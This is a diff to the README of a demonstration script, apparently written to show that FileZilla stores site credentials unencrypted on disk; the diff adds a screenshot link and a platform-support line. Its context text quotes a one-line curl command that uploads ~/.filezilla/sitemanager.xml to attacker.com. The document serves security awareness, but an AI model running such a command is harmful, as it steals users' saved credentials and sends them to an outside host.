@@ -1,10 +1,13 @@
 # Filezilla passwords revealer
 
+![Output of the script](https://i.gyazo.com/877d83a9801fff3c0c39a82df42b921c.png)
+
 This is a small script to demonstrate that the Filezilla credentials are stored **unencrypted** on the local drive and that any program, malware, or even node module running on your machine can trivially access them.  
 
 A single bash command is enough! `curl -F "credentials=@~/.filezilla/sitemanager.xml" attacker.com/credentials.php
 ` reads the local preference file and uploads it to a remote website.
 
+This script should work with Windows, Linux and Mac. Please [open an issue](https://github.com/christophetd/filezilla-passwords-revealer/issues/new) otherwise.
 ### Running
 
 - Clone this repository
